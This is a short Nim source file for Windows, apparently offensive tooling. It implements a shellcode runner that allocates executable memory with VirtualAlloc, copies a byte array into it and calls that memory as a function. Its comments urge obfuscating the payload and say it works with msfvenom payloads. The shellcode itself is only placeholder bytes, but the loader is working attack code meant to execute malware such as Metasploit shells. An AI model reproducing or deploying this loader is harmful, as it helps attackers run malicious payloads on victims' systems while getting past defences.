#[
    Author: Connor MacLeod, Twitter: @0xc130d
    License: BSD 3-Clause
]#

import winim/lean

proc executeLocally(shellcode: openArray[byte]): void =
    let pShellcodeDest = VirtualAlloc(
        NULL,
        shellcode.len,
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    copyMem(pShellcodeDest, shellcode[0].addr, shellcode.len)
    let f = cast[proc(){.nimcall.}](pShellcodeDest)
    f()

when defined(windows):
    when isMainModule:
        #Do what you want to obfuscate your shellcode as long as you end with a decoded/decrypted seq[byte] or array[byte]
        #Works with every msfvenom payload I've tried
        var shellcode: seq[byte] = @[byte 0xc, 0x13, 0x0d] #Replace with your own shellcode

        shellcode.executeLocally()